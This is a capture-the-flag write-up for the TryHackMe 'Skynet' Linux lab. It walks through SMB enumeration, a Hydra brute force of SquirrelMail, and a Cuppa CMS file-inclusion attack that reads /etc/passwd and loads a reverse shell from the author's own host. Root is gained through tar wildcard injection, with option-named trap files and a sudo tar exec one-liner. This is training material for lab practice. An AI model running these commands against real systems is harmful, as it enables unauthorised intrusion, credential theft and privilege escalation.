# CTF Writeup: [Skynet](https://tryhackme.com/room/skynet)

> **Platform:** [**TryHackMe**](https://tryhackme.com/) |
> **OS:** Linux |
> **Difficulty:** Easy |
> **Date:** 07.12.2025 |
> **Author:** [*S3Z4R*](https://tryhackme.com/p/SeZaR)

---
## 1. Reconnaissance
### Nmap
Let's start the scan with nmap to see what we have on the machine:
```bash
❯ nmap -sV -sC -T4 <Machine-IP>
Starting Nmap 7.92 ( https://nmap.org ) at 2025-12-07 13:26 CET
Nmap scan report for <Machine-IP>
Host is up (0.037s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: UIDL TOP RESP-CODES PIPELINING AUTH-RESP-CODE CAPA SASL
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: IMAP4rev1 Pre-login more have IDLE LOGIN-REFERRALS post-login ID LITERAL+ listed capabilities SASL-IR OK LOGINDISABLEDA0001 ENABLE
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time:
|   date: 2025-12-07T12:26:35
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
```
We can see that we have smb running on the machine, let's use `smbclient` as below:
```bash
❯ smbclient //<Machine-IP>/anonymous -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Nov 26 17:04:00 2020
  ..                                  D        0  Tue Sep 17 09:20:17 2019
  attention.txt                       N      163  Wed Sep 18 05:04:59 2019
  logs                                D        0  Wed Sep 18 06:42:16 2019

                9204224 blocks of size 1024. 5772004 blocks available
smb: \> get attention.txt
getting file \attention.txt of size 163 as attention.txt (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
smb: \> exit
```
In `attention.txt` we see that the passwords have changed, it is written by a user named `miles dyson`. That could be a user on the system.
```bash
❯ cat attention.txt
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
```
And in `logs` we have three log files and we can download and check them. `log2.txt` and `log3.txt` are empty but we can see `log1.txt`:
```bash
❯ cat log1.txt
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
```
Now that we have a password list, we need to find the login page.

### Directory Enumeration
In order to find the login page, we use a tool called `feroxbuster` which is really fast. We can use the command as below:
```bash
❯ feroxbuster -u http://<Machine-IP>/ -w kali-wordlists/dirb/big.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://<Machine-IP>/
 🚩  In-Scope Url          │ <Machine-IP>
 🚀  Threads               │ 50
 📖  Wordlist              │ kali-wordlists/dirb/big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      273c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      159l      221w     2667c http://<Machine-IP>/style.css
200      GET      144l      598w    44162c http://<Machine-IP>/image.png
200      GET       18l       43w      523c http://<Machine-IP>/
301      GET        9l       28w      310c http://<Machine-IP>/admin => http://<Machine-IP>/admin/
301      GET        9l       28w      307c http://<Machine-IP>/ai => http://<Machine-IP>/ai/
301      GET        9l       28w      311c http://<Machine-IP>/config => http://<Machine-IP>/config/
301      GET        9l       28w      308c http://<Machine-IP>/css => http://<Machine-IP>/css/
301      GET        9l       28w      307c http://<Machine-IP>/js => http://<Machine-IP>/js/
301      GET        9l       28w      317c http://<Machine-IP>/squirrelmail => http://<Machine-IP>/squirrelmail/
301      GET        9l       28w      313c http://<Machine-IP>/ai/notes => http://<Machine-IP>/ai/notes/
301      GET        9l       28w      324c http://<Machine-IP>/squirrelmail/config => http://<Machine-IP>/squirrelmail/config/
301      GET        9l       28w      324c http://<Machine-IP>/squirrelmail/images => http://<Machine-IP>/squirrelmail/images/
301      GET        9l       28w      325c http://<Machine-IP>/squirrelmail/plugins => http://<Machine-IP>/squirrelmail/plugins/
301      GET        9l       28w      339c http://<Machine-IP>/squirrelmail/plugins/administrator => http://<Machine-IP>/squirrelmail/plugins/administrator/
301      GET        9l       28w      321c http://<Machine-IP>/squirrelmail/src => http://<Machine-IP>/squirrelmail/src/
301      GET        9l       28w      334c http://<Machine-IP>/squirrelmail/plugins/calendar => http://<Machine-IP>/squirrelmail/plugins/calendar/
301      GET        9l       28w      336c http://<Machine-IP>/squirrelmail/plugins/bug_report => http://<Machine-IP>/squirrelmail/plugins/bug_report/
301      GET        9l       28w      324c http://<Machine-IP>/squirrelmail/themes => http://<Machine-IP>/squirrelmail/themes/
200      GET       78l      367w     2335c http://<Machine-IP>/squirrelmail/plugins/bug_report/README
301      GET        9l       28w      330c http://<Machine-IP>/squirrelmail/plugins/demo => http://<Machine-IP>/squirrelmail/plugins/demo/
200      GET       29l      119w      887c http://<Machine-IP>/squirrelmail/plugins/calendar/README
301      GET        9l       28w      333c http://<Machine-IP>/squirrelmail/plugins/filters => http://<Machine-IP>/squirrelmail/plugins/filters/
301      GET        9l       28w      333c http://<Machine-IP>/squirrelmail/plugins/fortune => http://<Machine-IP>/squirrelmail/plugins/fortune/
200      GET       11l       72w      485c http://<Machine-IP>/squirrelmail/plugins/fortune/README
200      GET       32l      127w      837c http://<Machine-IP>/squirrelmail/plugins/demo/README
200      GET       52l      430w     2672c http://<Machine-IP>/squirrelmail/plugins/filters/README
301      GET        9l       28w      330c http://<Machine-IP>/squirrelmail/plugins/info => http://<Machine-IP>/squirrelmail/plugins/info/
200      GET       38l      266w     1632c http://<Machine-IP>/squirrelmail/plugins/info/README
301      GET        9l       28w      328c http://<Machine-IP>/squirrelmail/themes/css => http://<Machine-IP>/squirrelmail/themes/css/
301      GET        9l       28w      330c http://<Machine-IP>/squirrelmail/plugins/test => http://<Machine-IP>/squirrelmail/plugins/test/
301      GET        9l       28w      335c http://<Machine-IP>/squirrelmail/plugins/translate => http://<Machine-IP>/squirrelmail/plugins/translate/
200      GET       58l      242w     1730c http://<Machine-IP>/squirrelmail/plugins/translate/README
200      GET       27l       70w      505c http://<Machine-IP>/squirrelmail/plugins/test/README
[...] - 3m    470861/470861  0s      found:33      errors:3375
[...] - 47s    20469/20469   433/s   http://<Machine-IP>/
[...] - 47s    20469/20469   434/s   http://<Machine-IP>/admin/
[...] - 46s    20469/20469   445/s   http://<Machine-IP>/ai/
[...] - 41s    20469/20469   496/s   http://<Machine-IP>/config/
[...] - 43s    20469/20469   476/s   http://<Machine-IP>/css/
[...] - 50s    20469/20469   411/s   http://<Machine-IP>/js/
[...] - 54s    20469/20469   381/s   http://<Machine-IP>/ai/notes/
[...] - 55s    20469/20469   369/s   http://<Machine-IP>/squirrelmail/
[...] - 62s    20469/20469   331/s   http://<Machine-IP>/squirrelmail/config/
[...] - 57s    20469/20469   360/s   http://<Machine-IP>/squirrelmail/images/
[...] - 67s    20469/20469   304/s   http://<Machine-IP>/squirrelmail/plugins/
[...] - 66s    20469/20469   311/s   http://<Machine-IP>/squirrelmail/plugins/administrator/
[...] - 69s    20469/20469   298/s   http://<Machine-IP>/squirrelmail/src/
[...] - 73s    20469/20469   280/s   http://<Machine-IP>/squirrelmail/plugins/bug_report/
[...] - 70s    20469/20469   291/s   http://<Machine-IP>/squirrelmail/plugins/calendar/
[...] - 78s    20469/20469   261/s   http://<Machine-IP>/squirrelmail/themes/
[...] - 77s    20469/20469   264/s   http://<Machine-IP>/squirrelmail/plugins/demo/
[...] - 69s    20469/20469   296/s   http://<Machine-IP>/squirrelmail/plugins/filters/
[...] - 74s    20469/20469   278/s   http://<Machine-IP>/squirrelmail/plugins/fortune/
[...] - 68s    20469/20469   300/s   http://<Machine-IP>/squirrelmail/plugins/info/
[...] - 57s    20469/20469   359/s   http://<Machine-IP>/squirrelmail/themes/css/
[...] - 48s    20469/20469   427/s   http://<Machine-IP>/squirrelmail/plugins/test/
[...] - 46s    20469/20469   447/s   http://<Machine-IP>/squirrelmail/plugins/translate/
```
By checking the pages we can see that the following page is accessible. The login page is at:
```bash
http://<Machine-IP>/squirrelmail/src/login.php
```
Next we apply the password list to this login page.

## 2. Initial Access
### Brute Force using Hydra 
Let's find the password:
```bash
❯ hydra -l milesdyson -P log1.txt <Machine-IP> http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^:Unknown user or password"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-07 14:19:21
[DATA] max 16 tasks per 1 server, overall 16 tasks, 31 login tries (l:1/p:31), ~2 tries per task
[DATA] attacking http-post-form://<Machine-IP>:80/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^:Unknown user or password
[80][http-post-form] host: <Machine-IP>   login: milesdyson   password: cyborg007haloterminator
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-07 14:19:32
```
So the username is `milesdyson` as we suspected, and the password is `cyborg007haloterminator`.
Let's use it to login.

### SquirrelMail Portal
After logging in, we can see that the first mail contains this text:
```bash
Subject:   	Samba Password reset
From:   	skynet@skynet
We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`
```
So the password is for the smb service, Let's try it!
```bash
smbclient -U milesdyson //<Machine-IP>/milesdyson
```
We can use the password we found and login. There are couple of `pdf` files and a folder called `notes`. We go to `notes` folder to see what is inside.

Apart from all the `Markdown` files, we can see a text file named `important.txt`.
```bash
❯ cat important.txt

1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```
That seems like a directory which was hidden! Let's check it out. 
```bash
http://<Machine-IP>/45kra24zxs28v3yd/
```
It is a valid page and we can see it. This is basically a new subdomain on the machine so in order to have a better understanding of what we are dealing with we need to use the directory enumeration again.

### Secret Directory Enumeration!
Let's use `feroxbuster` on the hidden directory to see where it leads us:
```bash
❯ feroxbuster -u http://<Machine-IP>/45kra24zxs28v3yd/ -w kali-wordlists/dirb/big.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://<Machine-IP>/45kra24zxs28v3yd
 🚩  In-Scope Url          │ <Machine-IP>
 🚀  Threads               │ 50
 📖  Wordlist              │ kali-wordlists/dirb/big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      273c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      321c http://<Machine-IP>/45kra24zxs28v3yd => http://<Machine-IP>/45kra24zxs28v3yd/
301      GET        9l       28w      335c http://<Machine-IP>/45kra24zxs28v3yd/administrator => http://<Machine-IP>/45kra24zxs28v3yd/administrator/
301      GET        9l       28w      342c http://<Machine-IP>/45kra24zxs28v3yd/administrator/alerts => http://<Machine-IP>/45kra24zxs28v3yd/administrator/alerts/
301      GET        9l       28w      343c http://<Machine-IP>/45kra24zxs28v3yd/administrator/classes => http://<Machine-IP>/45kra24zxs28v3yd/administrator/classes/
301      GET        9l       28w      346c http://<Machine-IP>/45kra24zxs28v3yd/administrator/components => http://<Machine-IP>/45kra24zxs28v3yd/administrator/components/
301      GET        9l       28w      338c http://<Machine-IP>/45kra24zxs28v3yd/administrator/js => http://<Machine-IP>/45kra24zxs28v3yd/administrator/js/
301      GET        9l       28w      341c http://<Machine-IP>/45kra24zxs28v3yd/administrator/media => http://<Machine-IP>/45kra24zxs28v3yd/administrator/media/
404      GET        0l        0w      273c http://<Machine-IP>/45kra24zxs28v3yd/model_images
301      GET        9l       28w      345c http://<Machine-IP>/45kra24zxs28v3yd/administrator/templates => http://<Machine-IP>/45kra24zxs28v3yd/administrator/templates/
301      GET        9l       28w      353c http://<Machine-IP>/45kra24zxs28v3yd/administrator/templates/default => http://<Machine-IP>/45kra24zxs28v3yd/administrator/templates/default/
301      GET        9l       28w      347c http://<Machine-IP>/45kra24zxs28v3yd/administrator/js/tiny_mce => http://<Machine-IP>/45kra24zxs28v3yd/administrator/js/tiny_mce/
301      GET        9l       28w      348c http://<Machine-IP>/45kra24zxs28v3yd/administrator/js/uploadify => http://<Machine-IP>/45kra24zxs28v3yd/administrator/js/uploadify/
301      GET        9l       28w      357c http://<Machine-IP>/45kra24zxs28v3yd/administrator/templates/default/css => http://<Machine-IP>/45kra24zxs28v3yd/administrator/templates/default/css/
301      GET        9l       28w      360c http://<Machine-IP>/45kra24zxs28v3yd/administrator/templates/default/images => http://<Machine-IP>/45kra24zxs28v3yd/administrator/templates/default/images/
301      GET        9l       28w      358c http://<Machine-IP>/45kra24zxs28v3yd/administrator/templates/default/html => http://<Machine-IP>/45kra24zxs28v3yd/administrator/templates/default/html/
301      GET        9l       28w      353c http://<Machine-IP>/45kra24zxs28v3yd/administrator/js/tiny_mce/langs => http://<Machine-IP>/45kra24zxs28v3yd/administrator/js/tiny_mce/langs/
301      GET        9l       28w      357c http://<Machine-IP>/45kra24zxs28v3yd/administrator/templates/default/swf => http://<Machine-IP>/45kra24zxs28v3yd/administrator/templates/default/swf/
301      GET        9l       28w      355c http://<Machine-IP>/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins => http://<Machine-IP>/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/
301      GET        9l       28w      354c http://<Machine-IP>/45kra24zxs28v3yd/administrator/js/tiny_mce/themes => http://<Machine-IP>/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/
301      GET        9l       28w      353c http://<Machine-IP>/45kra24zxs28v3yd/administrator/js/tiny_mce/utils => http://<Machine-IP>/45kra24zxs28v3yd/administrator/js/tiny_mce/utils/
[...] - 3m    225224/225224  0s      found:20      errors:1163
[...] - 82s    20469/20469   248/s   http://<Machine-IP>/45kra24zxs28v3yd/
[...] - 80s    20469/20469   256/s   http://<Machine-IP>/45kra24zxs28v3yd/administrator/
[...] - 83s    20469/20469   247/s   http://<Machine-IP>/45kra24zxs28v3yd/administrator/alerts/
[...] - 78s    20469/20469   263/s   http://<Machine-IP>/45kra24zxs28v3yd/administrator/classes/
[...] - 86s    20469/20469   239/s   http://<Machine-IP>/45kra24zxs28v3yd/administrator/components/
[...] - 83s    20469/20469   246/s   http://<Machine-IP>/45kra24zxs28v3yd/administrator/js/
[...] - 78s    20469/20469   264/s   http://<Machine-IP>/45kra24zxs28v3yd/administrator/media/
[...] - 69s    20469/20469   295/s   http://<Machine-IP>/45kra24zxs28v3yd/administrator/templates/
[...] - 48s    20469/20469   424/s   http://<Machine-IP>/45kra24zxs28v3yd/administrator/templates/default/
[...] - 41s    20469/20469   505/s   http://<Machine-IP>/45kra24zxs28v3yd/administrator/js/tiny_mce/
[...] - 43s    20469/20469   474/s   http://<Machine-IP>/45kra24zxs28v3yd/administrator/js/uploadify/
```
Great! We can see a new url:
```bash
http://<Machine-IP>/45kra24zxs28v3yd/administrator/
```
This is a new login page.
We know that it is using `Cuppa CMS` and by googling we can figure out that it is a vulnerabilty known as `Remote Code Inclusion`, let's apply it.

Using the [Cuppa CMS File Inclusion](https://www.exploit-db.com/exploits/25971) exploit we can see that we can hit the following url and get a result:
```bash
http://<Machine-IP>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
```
The output:
```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
milesdyson:x:1001:1001:,,,:/home/milesdyson:/bin/bash
dovecot:x:111:119:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
dovenull:x:112:120:Dovecot login user,,,:/nonexistent:/bin/false
postfix:x:113:121::/var/spool/postfix:/bin/false
mysql:x:114:123:MySQL Server,,,:/nonexistent:/bin/false
```
Knowing that the vulnerability exists, we can now use `Remote Code Execution` to get a shell by triggering it.

We will use the [PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) reverse shell and change IP to our own. Then we start a `python server` and a `netcat listener` as below:
```bash
❯ sudo python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
and:
```bash
❯ nc -nlvp 1234
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
```

We need to use the `RCE` to run our script. We can edit the url as such:
```bash
http://<Machine-IP>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<Your-IP>:8000/shell.php?
```
This will trigger your `netcat` and will help us get the shell.

We are basically telling the machine to run the `shell.php` script on our system which is accessible through the python server we started. This runs the reverse shell and we can see it on `netcat`.

## 3. User Flag
After the script runs we get the initial access to the account and going to the home directory we can find the first flag:
```bash
$ cat user.txt
7ce5...e807
```
## 4. Root Flag
We can see that we have a `backup.sh` file including:
```bash
$ cat backup.sh
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```
This sctipt makes a compressed backup from the files in `/var/www/html` so we need to make a custom script and force tar to run it.
```bash
echo "cat /root/root.txt > /tmp/flag.txt" > shell.sh
chmod +x shell.sh
```
This script reads the `root flag` and we make sure it is executable (`chmod`).

Next we have to tell `tar` to run the file.
We know that the command below is the way to escalate our priviledge:
```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
so we need the options after the `tar cf` command.

There is a workaround for that which took me an hour to find!
We can make the options into files with the same name! Because `tar -cf` is actually appending them after the command.

It means that it is running commands as below:
```bash
tar cf /admin
. . . 
tar cf /config
. . .
tar cf --checkpoint=1
tar cf --checkpoint-action=exec=sh shell.sh
```
So that why the order of creation is also important.

The final Commands in a single block are:
```bash
cd /var/www/html
echo "cat /root/root.txt > /tmp/flag.txt" > shell.sh
chmod +x shell.sh

# Create the trap files using touch
touch ./"--checkpoint=1"
touch ./"--checkpoint-action=exec=sh shell.sh"
```

Then we can see the flag at:
```bash
$ cat /tmp/flag.txt
3f03...a949
```


---
<p style="text-align: center; text-shadow: 0 0 5px #8B0000;"> ⸸ 𝕬𝖘 𝖞𝖔𝖚 𝖜𝖎𝖑𝖑 𝖎𝖙, 𝖘𝖔 𝖎𝖙 𝖘𝖍𝖆𝖑𝖑 𝖇𝖊 ⸸ 𝕾3𝖅4𝕽 ⸸ </p>
